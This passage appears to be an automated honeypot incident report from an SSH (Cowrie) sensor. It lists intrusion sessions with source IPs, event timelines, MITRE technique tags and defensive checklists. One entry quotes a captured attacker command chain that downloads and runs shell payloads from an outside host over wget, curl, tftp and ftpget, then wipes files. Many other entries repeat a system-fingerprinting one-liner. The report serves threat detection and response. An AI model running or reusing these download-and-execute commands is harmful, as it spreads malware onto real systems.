- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5  (Bash Script)
   SHA256: 183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a...
   Score : 84/100  |  VT: 35/74
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Download via TFTP: tftp
   ↳ Download via ftpget: ftpget
```

### 🔴 HIGH · IR-c17dcc464a14

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]37` |
| **First Seen** | 2026-07-24 19:25 |
| **Last Seen** | 2026-07-24 19:29 |
| **Session Duration** | 219s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91.92.42[.]213/phantom.sh; curl -O hxxp://91.92.42[.]213/phantom.sh; chmod 777 phantom.sh; sh phantom.sh; tftp 91.92.42[.]213 -c get phantom.sh; chmod 777 phantom.sh; sh phantom.sh; tftp -r phantom2.sh -g 91.92.42[.]213; chmod 777 phantom2.sh; sh phantom2.sh; ftpget -v -u anonymous -p anonymous -P 21 91.92.42[.]213 phantom1.sh phantom1.sh; sh phantom1.sh; rm -rf phantom.sh phantom.sh phantom2.sh phantom1.sh; rm -rf *` |
| **Download Attempts** | hxxp://91.92.42[.]213/phantom.sh, hxxp://91.92.42[.]213/phantom.sh, hxxp://91.92.42[.]213/bins/phantom.x86 |
| **Malware Analysis** | 183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5 (HIGH), 287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f (MEDIUM), 1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:25:42` | `cowrie.session.connect` |
| `2026-07-24 19:25:57` | `cowrie.client.version` |
| `2026-07-24 19:25:57` | `cowrie.client.kex` |
| `2026-07-24 19:27:09` | `cowrie.login.success` |
| `2026-07-24 19:27:55` | `cowrie.session.params` |
| `2026-07-24 19:27:55` | `cowrie.command.input` |
| `2026-07-24 19:27:55` | `cowrie.session.file_download` |
| `2026-07-24 19:27:55` | `cowrie.session.file_download` |
| `2026-07-24 19:27:56` | `cowrie.session.file_download` |
| `2026-07-24 19:27:56` | `cowrie.session.file_download.failed` |
| `2026-07-24 19:27:56` | `cowrie.session.file_download` |
| `2026-07-24 19:27:59` | `cowrie.session.file_download.failed` |
| `2026-07-24 19:27:59` | `cowrie.session.file_download` |
| `2026-07-24 19:27:59` | `cowrie.session.file_download` |
| `2026-07-24 19:28:02` | `cowrie.session.file_download.failed` |
| `2026-07-24 19:28:02` | `cowrie.session.file_download` |
| `2026-07-24 19:28:02` | `cowrie.session.file_download` |
| `2026-07-24 19:28:06` | `cowrie.session.file_download.failed` |
| `2026-07-24 19:28:06` | `cowrie.session.file_download` |
| `2026-07-24 19:28:06` | `cowrie.session.file_download` |
| `2026-07-24 19:28:06` | `cowrie.session.file_download.failed` |
| `2026-07-24 19:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]37` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-478e3d847f73

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:26 |
| **Last Seen** | 2026-07-24 19:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:26:16` | `cowrie.session.connect` |
| `2026-07-24 19:26:17` | `cowrie.client.version` |
| `2026-07-24 19:26:17` | `cowrie.client.kex` |
| `2026-07-24 19:26:21` | `cowrie.login.success` |
| `2026-07-24 19:26:24` | `cowrie.session.params` |
| `2026-07-24 19:26:24` | `cowrie.command.input` |
| `2026-07-24 19:26:24` | `cowrie.command.input` |
| `2026-07-24 19:26:24` | `cowrie.command.input` |
| `2026-07-24 19:26:24` | `cowrie.command.input` |
| `2026-07-24 19:26:24` | `cowrie.command.input` |
| `2026-07-24 19:26:24` | `cowrie.command.success` |
| `2026-07-24 19:26:24` | `cowrie.command.input` |
| `2026-07-24 19:26:24` | `cowrie.command.input` |
| `2026-07-24 19:26:24` | `cowrie.command.input` |
| `2026-07-24 19:26:24` | `cowrie.command.input` |
| `2026-07-24 19:26:25` | `cowrie.log.closed` |
| `2026-07-24 19:26:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a06a0b9dfea

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:26 |
| **Last Seen** | 2026-07-24 19:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:26:55` | `cowrie.session.connect` |
| `2026-07-24 19:26:55` | `cowrie.client.version` |
| `2026-07-24 19:26:55` | `cowrie.client.kex` |
| `2026-07-24 19:26:56` | `cowrie.login.success` |
| `2026-07-24 19:26:57` | `cowrie.session.params` |
| `2026-07-24 19:26:57` | `cowrie.command.input` |
| `2026-07-24 19:26:57` | `cowrie.command.input` |
| `2026-07-24 19:26:57` | `cowrie.command.input` |
| `2026-07-24 19:26:57` | `cowrie.command.input` |
| `2026-07-24 19:26:57` | `cowrie.command.input` |
| `2026-07-24 19:26:57` | `cowrie.command.success` |
| `2026-07-24 19:26:57` | `cowrie.command.input` |
| `2026-07-24 19:26:57` | `cowrie.command.input` |
| `2026-07-24 19:26:57` | `cowrie.command.input` |
| `2026-07-24 19:26:57` | `cowrie.command.input` |
| `2026-07-24 19:26:57` | `cowrie.log.closed` |
| `2026-07-24 19:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72795098f572

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:27 |
| **Last Seen** | 2026-07-24 19:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:27:24` | `cowrie.session.connect` |
| `2026-07-24 19:27:24` | `cowrie.client.version` |
| `2026-07-24 19:27:24` | `cowrie.client.kex` |
| `2026-07-24 19:27:27` | `cowrie.login.success` |
| `2026-07-24 19:27:30` | `cowrie.session.params` |
| `2026-07-24 19:27:30` | `cowrie.command.input` |
| `2026-07-24 19:27:30` | `cowrie.command.input` |
| `2026-07-24 19:27:30` | `cowrie.command.input` |
| `2026-07-24 19:27:30` | `cowrie.command.input` |
| `2026-07-24 19:27:30` | `cowrie.command.input` |
| `2026-07-24 19:27:30` | `cowrie.command.success` |
| `2026-07-24 19:27:30` | `cowrie.command.input` |
| `2026-07-24 19:27:30` | `cowrie.command.input` |
| `2026-07-24 19:27:30` | `cowrie.command.input` |
| `2026-07-24 19:27:30` | `cowrie.command.input` |
| `2026-07-24 19:27:31` | `cowrie.log.closed` |
| `2026-07-24 19:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fe24d1d2198

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:28 |
| **Last Seen** | 2026-07-24 19:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:28:35` | `cowrie.session.connect` |
| `2026-07-24 19:28:36` | `cowrie.client.version` |
| `2026-07-24 19:28:36` | `cowrie.client.kex` |
| `2026-07-24 19:28:39` | `cowrie.login.success` |
| `2026-07-24 19:28:41` | `cowrie.session.params` |
| `2026-07-24 19:28:41` | `cowrie.command.input` |
| `2026-07-24 19:28:41` | `cowrie.command.input` |
| `2026-07-24 19:28:41` | `cowrie.command.input` |
| `2026-07-24 19:28:41` | `cowrie.command.input` |
| `2026-07-24 19:28:41` | `cowrie.command.input` |
| `2026-07-24 19:28:41` | `cowrie.command.success` |
| `2026-07-24 19:28:41` | `cowrie.command.input` |
| `2026-07-24 19:28:41` | `cowrie.command.input` |
| `2026-07-24 19:28:41` | `cowrie.command.input` |
| `2026-07-24 19:28:41` | `cowrie.command.input` |
| `2026-07-24 19:28:42` | `cowrie.log.closed` |
| `2026-07-24 19:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2e9ada5b170

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:28 |
| **Last Seen** | 2026-07-24 19:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:28:44` | `cowrie.session.connect` |
| `2026-07-24 19:28:44` | `cowrie.client.version` |
| `2026-07-24 19:28:44` | `cowrie.client.kex` |
| `2026-07-24 19:28:45` | `cowrie.login.success` |
| `2026-07-24 19:28:46` | `cowrie.session.params` |
| `2026-07-24 19:28:46` | `cowrie.command.input` |
| `2026-07-24 19:28:46` | `cowrie.command.input` |
| `2026-07-24 19:28:46` | `cowrie.command.input` |
| `2026-07-24 19:28:46` | `cowrie.command.input` |
| `2026-07-24 19:28:46` | `cowrie.command.input` |
| `2026-07-24 19:28:46` | `cowrie.command.success` |
| `2026-07-24 19:28:46` | `cowrie.command.input` |
| `2026-07-24 19:28:46` | `cowrie.command.input` |
| `2026-07-24 19:28:46` | `cowrie.command.input` |
| `2026-07-24 19:28:46` | `cowrie.command.input` |
| `2026-07-24 19:28:46` | `cowrie.log.closed` |
| `2026-07-24 19:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98da395a402b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:29 |
| **Last Seen** | 2026-07-24 19:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:29:43` | `cowrie.session.connect` |
| `2026-07-24 19:29:44` | `cowrie.client.version` |
| `2026-07-24 19:29:44` | `cowrie.client.kex` |
| `2026-07-24 19:29:47` | `cowrie.login.success` |
| `2026-07-24 19:29:49` | `cowrie.session.params` |
| `2026-07-24 19:29:49` | `cowrie.command.input` |
| `2026-07-24 19:29:49` | `cowrie.command.input` |
| `2026-07-24 19:29:49` | `cowrie.command.input` |
| `2026-07-24 19:29:49` | `cowrie.command.input` |
| `2026-07-24 19:29:49` | `cowrie.command.input` |
| `2026-07-24 19:29:49` | `cowrie.command.success` |
| `2026-07-24 19:29:49` | `cowrie.command.input` |
| `2026-07-24 19:29:49` | `cowrie.command.input` |
| `2026-07-24 19:29:49` | `cowrie.command.input` |
| `2026-07-24 19:29:49` | `cowrie.command.input` |
| `2026-07-24 19:29:50` | `cowrie.log.closed` |
| `2026-07-24 19:29:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93f7c6e66533

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:30 |
| **Last Seen** | 2026-07-24 19:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:30:37` | `cowrie.session.connect` |
| `2026-07-24 19:30:37` | `cowrie.client.version` |
| `2026-07-24 19:30:38` | `cowrie.client.kex` |
| `2026-07-24 19:30:38` | `cowrie.login.success` |
| `2026-07-24 19:30:40` | `cowrie.session.params` |
| `2026-07-24 19:30:40` | `cowrie.command.input` |
| `2026-07-24 19:30:40` | `cowrie.command.input` |
| `2026-07-24 19:30:40` | `cowrie.command.input` |
| `2026-07-24 19:30:40` | `cowrie.command.input` |
| `2026-07-24 19:30:40` | `cowrie.command.input` |
| `2026-07-24 19:30:40` | `cowrie.command.success` |
| `2026-07-24 19:30:40` | `cowrie.command.input` |
| `2026-07-24 19:30:40` | `cowrie.command.input` |
| `2026-07-24 19:30:40` | `cowrie.command.input` |
| `2026-07-24 19:30:40` | `cowrie.command.input` |
| `2026-07-24 19:30:40` | `cowrie.log.closed` |
| `2026-07-24 19:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9544e0b6d06

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:30 |
| **Last Seen** | 2026-07-24 19:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:30:52` | `cowrie.session.connect` |
| `2026-07-24 19:30:53` | `cowrie.client.version` |
| `2026-07-24 19:30:53` | `cowrie.client.kex` |
| `2026-07-24 19:30:56` | `cowrie.login.success` |
| `2026-07-24 19:30:58` | `cowrie.session.params` |
| `2026-07-24 19:30:58` | `cowrie.command.input` |
| `2026-07-24 19:30:58` | `cowrie.command.input` |
| `2026-07-24 19:30:58` | `cowrie.command.input` |
| `2026-07-24 19:30:58` | `cowrie.command.input` |
| `2026-07-24 19:30:58` | `cowrie.command.input` |
| `2026-07-24 19:30:58` | `cowrie.command.success` |
| `2026-07-24 19:30:58` | `cowrie.command.input` |
| `2026-07-24 19:30:58` | `cowrie.command.input` |
| `2026-07-24 19:30:58` | `cowrie.command.input` |
| `2026-07-24 19:30:58` | `cowrie.command.input` |
| `2026-07-24 19:30:59` | `cowrie.log.closed` |
| `2026-07-24 19:31:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4c5d0423f78

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:32 |
| **Last Seen** | 2026-07-24 19:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:32:02` | `cowrie.session.connect` |
| `2026-07-24 19:32:03` | `cowrie.client.version` |
| `2026-07-24 19:32:03` | `cowrie.client.kex` |
| `2026-07-24 19:32:07` | `cowrie.login.success` |
| `2026-07-24 19:32:09` | `cowrie.session.params` |
| `2026-07-24 19:32:09` | `cowrie.command.input` |
| `2026-07-24 19:32:09` | `cowrie.command.input` |
| `2026-07-24 19:32:09` | `cowrie.command.input` |
| `2026-07-24 19:32:09` | `cowrie.command.input` |
| `2026-07-24 19:32:09` | `cowrie.command.input` |
| `2026-07-24 19:32:09` | `cowrie.command.success` |
| `2026-07-24 19:32:09` | `cowrie.command.input` |
| `2026-07-24 19:32:09` | `cowrie.command.input` |
| `2026-07-24 19:32:09` | `cowrie.command.input` |
| `2026-07-24 19:32:09` | `cowrie.command.input` |
| `2026-07-24 19:32:11` | `cowrie.log.closed` |
| `2026-07-24 19:32:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41a97d97d33d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:32 |
| **Last Seen** | 2026-07-24 19:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:32:29` | `cowrie.session.connect` |
| `2026-07-24 19:32:29` | `cowrie.client.version` |
| `2026-07-24 19:32:29` | `cowrie.client.kex` |
| `2026-07-24 19:32:30` | `cowrie.login.success` |
| `2026-07-24 19:32:31` | `cowrie.session.params` |
| `2026-07-24 19:32:31` | `cowrie.command.input` |
| `2026-07-24 19:32:31` | `cowrie.command.input` |
| `2026-07-24 19:32:31` | `cowrie.command.input` |
| `2026-07-24 19:32:31` | `cowrie.command.input` |
| `2026-07-24 19:32:31` | `cowrie.command.input` |
| `2026-07-24 19:32:31` | `cowrie.command.success` |
| `2026-07-24 19:32:31` | `cowrie.command.input` |
| `2026-07-24 19:32:31` | `cowrie.command.input` |
| `2026-07-24 19:32:31` | `cowrie.command.input` |
| `2026-07-24 19:32:31` | `cowrie.command.input` |
| `2026-07-24 19:32:32` | `cowrie.log.closed` |
| `2026-07-24 19:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-295fe352dbaf

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:33 |
| **Last Seen** | 2026-07-24 19:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
